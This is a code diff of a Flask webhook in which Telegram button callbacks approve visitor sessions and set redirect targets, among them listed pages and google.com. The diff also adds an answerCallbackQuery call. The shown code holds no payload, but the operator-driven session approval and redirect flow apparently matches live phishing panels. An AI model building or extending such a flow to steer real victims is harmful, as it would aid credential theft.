@@ -221,23 +221,37 @@ def thnks():
 def webhook():
     update = request.get_json()
     print("Webhook received:", update)
+    
     if not update or "callback_query" not in update:
         print("No callback_query in update")
         return jsonify({"status": "ignored"}), 200
 
     try:
-        data = update["callback_query"]["data"]
+        callback_query = update["callback_query"]
+        data = callback_query["data"]
         print("Callback data:", data)
+        
         session_id, action = data.split(":")
         print(f"Session ID: {session_id}, Action: {action}")
+        
         if session_id in SESSION_STATUS:
             if action in [b["page"] for b in PAGES] or action == "https://google.com":
                 SESSION_STATUS[session_id]["approved"] = True
                 SESSION_STATUS[session_id]["redirect_url"] = action
-                print("Session updated:", SESSION_STATUS[session_id])
+                print(f"Session {session_id} approved with redirect to: {action}")
+                
+                # Answer callback query to remove loading state
+                answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+                requests.post(answer_url, json={
+                    "callback_query_id": callback_query["id"],
+                    "text": f"Redirecting...",
+                    "show_alert": False
+                })
+                
                 return jsonify({"status": "ok"}), 200
-            print("Unknown action:", action)
-            return jsonify({"status": "unknown action"}), 404
+            else:
+                print("Unknown action:", action)
+                return jsonify({"status": "unknown action"}), 404
         else:
             print("Unknown session:", session_id)
             return jsonify({"status": "unknown session"}), 404
